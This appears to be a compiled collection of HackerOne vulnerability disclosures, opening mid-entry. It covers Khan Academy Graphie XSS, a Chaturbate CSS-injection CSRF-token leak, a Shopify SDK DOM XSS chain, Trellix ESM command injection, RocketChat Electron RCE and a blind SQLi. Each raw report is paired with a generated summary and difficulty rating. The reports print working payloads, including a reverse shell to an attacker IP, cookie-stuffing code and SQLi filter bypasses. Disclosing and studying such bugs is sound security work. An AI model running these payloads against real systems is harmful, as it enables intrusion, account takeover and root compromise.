2. Use the XSS to send a malicious postMessage to a Jetpack-enabled site, bypassing origin checks and injecting arbitrary JavaScript via the avatar_URL parameter
Exploitation Difficulty:
The vulnerability requires understanding and chaining two distinct flaws: (1) an XSS in widgets.wp.com that requires specific parameter manipulation, and (2) insecure postMessage handling in Jetpack that trusts messages from the compromised domain. The attacker must maintain context between these components and understand their subtle interaction where the XSS bypasses the origin check.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2846011: XSS on using the legacy "Graphie To Png" API
================================================================================
RAW DESCRIPTION:

An attacker can can upload malicious graphies via (http://graphie-to-png.kasandbox.org/) and (http://graphie-to-png.khanacademy.systems/) that exploit the graphie renderer.
<image_0>
Proof of concept
Step 1: Uploading a malicious graphie
<image_1>
Malicious SVG: The SVG is modified to include a malicious onload attribute.
Code 41 Bytes
1<svg ... onload="alert('SIKN')">...</svg>
Malicious JSON: A label is modified with typesetAsMath: false, causing the graphie renderer to inject our code to DOM. This is what will target khanacademy.org
Code 122 Bytes
1{
2	"labels": [
3		{
4			"content": "<script>alert('SIKN')</script>",
5			"typesetAsMath": false,
6			...
7		},
8		...
9	],
10	...
11}
Code 258 Bytes
1var form = new FormData();
2form.append("js", ORIGINAL_JS);
3form.append("svg", XSS_SVG);
4form.append("other_data", JSON.stringify(XSS_JSON));
5
6await fetch("http://graphie-to-png.kasandbox.org/svg", {
7    "method": "POST",
8    "body": form
9}).then(r=>r.text())
Step 2: Wait patiently
Wait until cdn.kastatic.org updates its cache, for this example I had already prepared it by not caching the original graphie (https://cdn.kastatic.org/ka-perseus-graphie/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg)
<image_2>
Impact
XSS on pages that use graphies, potentially leading to account takeovers.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to perform a Cross-Site Scripting (XSS) attack by uploading a malicious SVG and JSON file to the 'Graphie to PNG' API. The SVG includes an onload attribute that executes JavaScript, and the JSON file contains a script in the labels content that is injected into the DOM when the graphie is rendered. This can lead to account takeovers on pages that use graphies.

Steps to Reproduce:
1. Upload a malicious SVG with an onload attribute and a JSON file with a script in the labels content to the Graphie to PNG API.
2. Wait for the CDN to update its cache and then access the malicious graphie on a page that uses graphies to trigger the XSS.
Exploitation Difficulty:
The attack involves multiple components (SVG, JSON, and API interaction) and requires understanding how the graphie renderer processes these components. The interaction between the SVG's onload attribute and the JSON's labels content is subtle and not immediately obvious. Additionally, the attacker must understand the caching behavior of the CDN to ensure the malicious graphie is served to victims.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/386334: CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS 
================================================================================
RAW DESCRIPTION:

Hi there,
There's a CSS injection here: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX
Code 181 Bytes
1  body, div#main, div.content, div.block, div.section {margin: 0px; padding: 0px;}
2  body {min-width:800px;}
3  div.content {width: 100%;}
4  
5  body {background: }*{background:red;}
6
This allows an attacker to enumerate the CSRF token. Once the CSRF token is enumerated, we can
POC
Go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
Now go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR and let it do it's magic :)
<image_0>
There are numerous endpoints like POST /choose_broadcaster_chat_color where it returns Content-Type: text/html; charset=utf-8 that could potentially allow a hacker to combine the two for XSS (I haven't gotten that far yet)
Do you mind asking your HackerOne contact to allow collaboration on your program, so I can invite another researcher that helped me exploit this fully?
Thanks,
Ben
Impact




================================================================================
Vulnerability Description:
The vulnerability involves a CSS injection on the /embed/ endpoint via the bgcolor parameter, which can be exploited to leak a user's CSRF token. This token can then be used to perform CSRF attacks or potentially combined with other endpoints to achieve XSS.

Steps to Reproduce:
1. Navigate to the vulnerable URL with the CSS injection parameter: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX
2. Visit the attacker's demo page to extract the CSRF token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
3. Return to the demo page to observe the stolen token: http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR
Exploitation Difficulty:
The attack requires understanding and exploiting CSS injection to leak sensitive information (CSRF token), and then leveraging that token in subsequent attacks. The interaction between CSS injection and CSRF token leakage is non-obvious and requires multiple steps to execute effectively.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/422043: H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing
================================================================================
RAW DESCRIPTION:

Hi Team!
I'm reporting a rather unusual DOMXSS that allows an attacker to perform a XSS attack on any Shopify apps that use the Embedded SDK. To exploit this, several techniques were chained together: Cookie Stuffing -> Login CSRF -> (Not Open) Redirect -> DOMXSS.
Details
Inspired by #381192, I decided to check all pages to see if there's any broken origin validation. The results were frustrating since they all seemed to be done properly. However I noticed embedded apps did it in a way that it verifies if the coming origin is the logged-in store. Say if I am an admin on foobar.myshopify.com, then an embedded app will check if in-coming messages originate from https://foobar.myshopify.com. I went ahead to look up some documentations, confirming this is by design (shopOrigin):
Code 84 Bytes
1ShopifyApp.init({
2  shopOrigin: 'https://CURRENT_LOGGED_IN_SHOP.myshopify.com'
3[...]
Now this is interesting because by design we can execute any JavaScript on our own stores. That means, I can iframe an embedded app on my store, then post any message to it and it will accept it. So I quickly beautify the SDK source code to see if there's any interesting event. Checking common DOMXSS sinks I found that it registers the Shopify.API.setWindowLocation event that navigates to a said destination.
https://cdn.shopify.com/s/assets/external/app.js
Code 292 Bytes
1e.setWindowLocation = function(e) {
2    return window.location = e
3}, e.bindWindowLocation = function() {
4    return _Shopify.Messenger.addHandler("Shopify.API.setWindowLocation", function(e) {
5        return function(t, n) {
6            return e.setWindowLocation(n)
7        }
8    }(this))
9}
By navigate to a javascript: pseudo URL it can lead to XSS. This can be verified by opening any embedded apps and execute the following code in the DevTools' console
Code 140 Bytes
1$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
<image_0>
However this XSS is almost useless because the embedded app is authenticated as us, the attacker. When we try to exploit it on a victim it won't work because they are not logged into our store. So you could say this is, a self DOMXSS. Well, almost.
What if we use Login CSRF to force a victim to be logged into our store? After the victim is logged in to our store, we can then instruct user's browser to log into the embedded app as us by navigating to /admin/oauth/authorize. Then the current logged in store will be ours. I came up with an idea to stuff the session cookies using JavaScript.
The session cookies consist of _secure_admin_session_id and _master_udr. While I could simply write _secure_admin_session_id with docuemnt.cookie API, I realized a problem with _master_udr. Unlike _secure_admin_session_id, _master_udr is scoped to .myshopify.com. If we triy to write our _master_udr, then this will happen:
Code 386 Bytes
1GET https://canvasfoobar.myshopify.com/admin/oauth/authorize?client_id=d25e45407e508f96409c2dd796e9bd95&redirect_uri=https%3A%2F%2Fscript-editor.shopifycloud.com%2Fauth%2Fshopify%2Fcallback&response_type=code&scope=write_scripts%2Cread_products%2Cread_customers&state=a HTTP/1.1
2Host: canvasfoobar.myshopify.com
3Cookie: _master_udr=LEGIT; _master_udr=EVIL; _secure_admin_session_id=EVIL
The legitimate _master_udr will override our evil one and the server will refuse to authenticate as us. There is a trick fortunately.
“Cookies with longer paths are listed before cookies with shorter paths.” –RFC 6265
By setting a cookie with a very specific (/admin/oauth in this case) we can outrun the original one. The code that we will use to force a login will be:
Code 124 Bytes
1document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
2document.cookie = '_master_udr=EVIL;path=/admin/oauth';
Another problem is even after all this, the victim will be logged into the embedded app as us. That means, all actions only affect our store.
To solve this we can simply relog in the victim to the embedded app. Since the victim is still logged in their store, we can navigate the victim to https://victim.myshopify.com/admin/oauth/authorize to trigger the auth flow for the embedded app. The drawback is we need to know which store the victim is logged in as. Luckily https://www.shopify.com/path will redirect to the last logged in store of a user, therefore navigating to https://www.shopify.com/admin/oauth/authorize will lead them to https://victim.myshopify.com/admin/oauth/authorize.
Eventually we have our XSS running on the embedded app's domain running with the victim's session.
Steps to Reproduce
In the PoC, Script Editor will be used as an example.
Be logged into your store as an admin and have Script Editor installed
Navigate to https://canvasfoobar.myshopify.com/products/canary
After the iframe turns grey, click it
After a while, a fake modal dialog will show up and a New Script will be created
I'm also attaching a video demo.
Fix
I recommend fixing this issue by validating the URL for Shopify.API.setWindowLocation. The other small issues are by design so they are hard to fix.
Impact
Perform unauthorized actions on a store admin on any embedded apps.



================================================================================
Vulnerability Description:
This vulnerability is a DOM-based XSS in Shopify's Embedded SDK, which allows an attacker to execute arbitrary JavaScript in the context of any Shopify app using the SDK. The attack chains multiple techniques: cookie stuffing to force a victim to log into the attacker's store, login CSRF to authenticate the victim in the embedded app, and a DOMXSS via the Shopify.API.setWindowLocation method to execute malicious code.

Steps to Reproduce:
1. Log in to your Shopify store as an admin and install the Script Editor app.
2. Navigate to a product page (e.g., https://canvasfoobar.myshopify.com/products/canary) and wait for the iframe to turn grey, then click it.
3. Observe the fake modal dialog appearing and a new script being created without authorization.
Exploitation Difficulty:
The attack involves multiple complex components: cookie stuffing with path manipulation to override legitimate cookies, login CSRF to force authentication, and a DOMXSS via a non-obvious message handler in the Embedded SDK. The attacker must also understand the subtle interaction between cookie paths and session management, as well as the specific behavior of the Shopify.API.setWindowLocation method. The novel use of cookie stuffing combined with login CSRF and DOMXSS makes this a highly sophisticated attack.

--------------------------------------------------------------------------------



OS Command Injection Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/2817658: Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
================================================================================
RAW DESCRIPTION:

Product: Trellix Enterprise Security Manager (ESM)
Version Tested: 11.6.10
Source: Publicly available trial version from Trellix Trials — "Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10."
Potentially Affected Versions: Latest version could also be vulnerable
Vulnerability Type: Path Traversal, Command Injection
Severity: Critical

Summary:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows unauthenticated access to the internal Snowservice API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.
The root cause lies in the way the ESM forwards requests to the AJP service using ProxyPass, specifically configured as:
Code 46 Bytes
1ProxyPass         /rs  ajp://localhost:8009/rs
This configuration permits unintended external access to internal paths by leveraging the ..;/ traversal sequence, which bypasses typical directory restrictions. This technique is further explained in Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out by Orange Tsai at Black Hat USA 2018 (source). The ..;/ sequence bypasses common path validation checks, making it possible to access restricted internal APIs. Combined with command injection vulnerabilities, this leads to a critical security risk.

Product reports - releases affected:
Wherever possible, please test against the latest released version.
Tested on Trellix Enterprise Security Manager version 11.6.10 (Linux)
Other versions may also be affected (please verify)

Website reports - browsers verified in:
Please provide the full URL.
Tested via HTTP requests (no specific browser required)

Steps to reproduce:
Access the /rs/..;/Snowservice/SnowflexAdminServices/CreateNode endpoint without authentication to confirm unauthenticated access.
Submit a request to the CreateNode endpoint to verify unauthorized path traversal access to the internal API.
Exploit command injection via the ManageNode endpoint to execute commands with root privileges.
Step 1: Unauthenticated API Access via Path Traversal
The following request demonstrates unauthenticated access to the internal API:
Request Example:
Code 386 Bytes
1POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
2Host: [ESM IP]
3Accept: application/json
4Content-Type: application/json
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
6Content-Length: 118
7
8{
9    "serverName": "test132", 
10    "ip": "127.0.0.1",
11    "port": "1212",
12    "peerPort": "1210"
13}
Step 2: Remote Code Execution via Command Injection with Root Privileges
The following command injection payload in the name parameter provides remote root access:
Request Example:
Code 466 Bytes
1POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
2Host: [ESM IP]
3Accept: application/json
4Content-Type: application/json
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
6Content-Length: 186
7
8{
9    "serverName": "test132",
10    "processes": [
11        {
12            "name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
13            "signal": "Restart"
14        }
15    ]
16}
This payload opens a reverse shell to the attacker’s machine, providing root access and full control over the system.

Supporting material/references:
Screenshot 1: screenshot.png - This screenshot shows the HTTP request used to exploit the command injection vulnerability and the reverse shell connection received by the attacker.
Screenshot 2: screenshot2.png - This screenshot displays the process list on the compromised system, showing the injected command being executed as root. It also shows the whole command executed.

Impact
Exploiting this vulnerability allows an attacker to:
Gain unauthenticated access to internal API endpoints through path traversal.
Execute arbitrary commands as root, compromising the system entirely.
The impact of this vulnerability is rated Critical due to the combination of unauthenticated path traversal, insecure proxy forwarding, and command injection.

Recommendations
Secure AJP Proxy Configuration
Review and restrict ProxyPass configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.
Avoid using ambiguous path traversal characters like ..;/ by implementing additional path validation for all forwarded requests.
Review and restrict ProxyPass configurations. Ensure that internal paths are only accessible from trusted sources and prevent external access.
Avoid using ambiguous path traversal characters like ..;/ by implementing additional path validation for all forwarded requests.
Path Validation and Access Control
Implement robust path validation to reject sequences like ..;/ that enable unauthorized access.
Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.
Implement robust path validation to reject sequences like ..;/ that enable unauthorized access.
Ensure access controls are in place for internal APIs, blocking all unauthorized users and enforcing authentication.
Command Injection Prevention
Enforce strict input sanitization, especially for sensitive parameters like name. Reject special characters and command syntax in user inputs.
Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.
Enforce strict input sanitization, especially for sensitive parameters like name. Reject special characters and command syntax in user inputs.
Implement whitelisting of acceptable commands and arguments to prevent arbitrary code execution.
Principle of Least Privilege
Avoid running the service as root to reduce potential damage if an exploit occurs.
Avoid running the service as root to reduce potential damage if an exploit occurs.

Impact Summary
This vulnerability in Trellix ESM 11.6.10 allows unauthenticated access to an internal API through path traversal enabled by insecure AJP forwarding and lacks input validation, permitting command injection with root execution. Confirmed on the publicly available trial version, this vulnerability likely affects other versions and requires urgent remediation.

Note to Vendor
It is recommended that Trellix verify which versions of the software are affected by this vulnerability. This issue may not be limited to version 11.6.10 and could impact previous versions as well. A thorough review of historical versions is advised to assess the scope of this vulnerability and ensure proper patching across affected releases.
Thank you for reviewing this report. I am available for any further questions or additional information.
Best Regards,

Rafal Gill (r4v)



================================================================================
Vulnerability Description:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows unauthenticated access to the internal Snowservice API and enables remote code execution through command injection, executed as the root user. This vulnerability results from multiple flaws in the application's design and configuration, including improper handling of path traversal, insecure forwarding to an AJP backend without adequate validation, and lack of authentication for accessing internal API endpoints.

Steps to Reproduce:
1. Access the /rs/..;/Snowservice/SnowflexAdminServices/CreateNode endpoint without authentication to confirm unauthenticated access.
2. Submit a request to the CreateNode endpoint to verify unauthorized path traversal access to the internal API.
3. Exploit command injection via the ManageNode endpoint to execute commands with root privileges.
Exploitation Difficulty:
The attack involves multiple components (path traversal, command injection, AJP proxy misconfiguration) and requires understanding of subtle interactions between these components. The use of ..;/ for path traversal is a non-obvious technique that requires specific knowledge of AJP proxy behavior and path normalization bypasses.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/899964: XSS leads to RCE on the RocketChat desktop client.
================================================================================
RAW DESCRIPTION:

Summary: It is possible to call electron.shell.openExternal from javascript inside a server webview.
Description: The document onclick handler allows executing electron.shell.openExternal by crafting an attacker-controlled link and dispatching a click event on it after overwriting Regex.test.
Releases Affected:
Rocket.Chat Desktop Client up to version 2.17.9
Steps To Reproduce (from initial installation to vulnerability):
Have a XSS vulnerability such as #894462 or #899954.
Call the following payload (for macos, adjust for other OSes as required):
Code 485 Bytes
1(function() {
2    const payload = `file:///System/Applications/Calculator.app`;
3    var counter = 0;
4    var target = document.createElement(`a`);
5    target.setAttribute(`href`, payload);
6    document.body.appendChild(target);
7    var old_test = RegExp.prototype.test;
8    RegExp.prototype.test = function (s) {
9        if (s === payload) {
10            return (++counter > 3);
11        }
12        return old_test.call(this, s);
13    };
14    target.dispatchEvent(new Event(`click`));
15})();
Browse to a page with the XSS payload.
Use your freshly opened calculator to calculate the result of 7*191.
Impact
An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call electron.shell.openExternal with arbitrary URLs, leading to arbitrary command execution.



================================================================================
Vulnerability Description:
An XSS vulnerability in RocketChat's desktop client (up to v2.17.9) allows attackers to execute arbitrary commands by exploiting electron.shell.openExternal via a crafted link and Regex.test manipulation, leading to Remote Code Execution (RCE).

Steps to Reproduce:
1. Exploit an existing XSS vulnerability in RocketChat (e.g., #894462 or #899954).
2. Inject and execute the provided JavaScript payload to call electron.shell.openExternal with a malicious URL (e.g., file:///System/Applications/Calculator.app).
3. Trigger the payload by clicking the crafted link, bypassing security checks via Regex.test manipulation.
4. Observe arbitrary command execution (e.g., calculator app opening).
Exploitation Difficulty:
The attack requires chaining XSS with Electron API abuse and Regex prototype manipulation, involving non-obvious interactions between webview JS execution and desktop environment privileges.

--------------------------------------------------------------------------------



SQL Injection Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/982202: SQLi in login form of █████
================================================================================
RAW DESCRIPTION:

Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.
Code 50 Bytes
1POST /██████████.asp HTTP/█████.████
2Host: ███████
Description
Code 777 Bytes
1POST /██████.asp HTTP/████.███
2Host: █████
3Connection: close
4Content-Length: 45
5Cache-Control: max-age=0
6Upgr███████e-Insecure-Requests: ███
7Origin: https://████
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?████████
14Sec-Fetch-Dest: document
15Referer: https://████████/wireless/index.asp
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18Cookie: █████████████████
19
20usr='/**/or/**/lastName!='&pwd=██████████
returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with /**/.
To summarize:
usr='/**/or/**/lastName!='&pwd=████████ -> 302
usr='/**/or/**/abc!='&pwd=███ -> 500
case error g██████████get (which could be used to exfil data):
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████ -> 302
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████ -> 500
Using this, we can prove that there are 26 user accounts:
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████ -> 302
usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████ -> 500
I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.
if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission
Impact
SQLi, likely escalation to full service compromise



================================================================================
Vulnerability Description:
The login form is vulnerable to blind SQL injection due to improper input sanitization, allowing an attacker to infer database structure and extract information through differential responses (302 vs 500 errors). The attack requires bypassing space character filtering using /**/ comments.

Steps to Reproduce:
1. Send a POST request to the vulnerable login form with a crafted SQLi payload replacing spaces with /**/ to bypass filtering, e.g., usr='/**/or/**/lastName!='&pwd=████████
2. Observe the response codes (302 for valid SQL conditions, 500 for invalid) to infer database structure and perform blind SQLi
Exploitation Difficulty:
While the vulnerability itself is a standard SQLi, the discovery required: 1) identifying the space character filtering, 2) developing a bypass using /**/ syntax, 3) constructing differential queries based on error responses, and 4) interpreting blind SQLi results through HTTP status codes. The need to chain these non-obvious bypass techniques with blind inference methods elevates the complexity.

--------------------------------------------------------------------------------



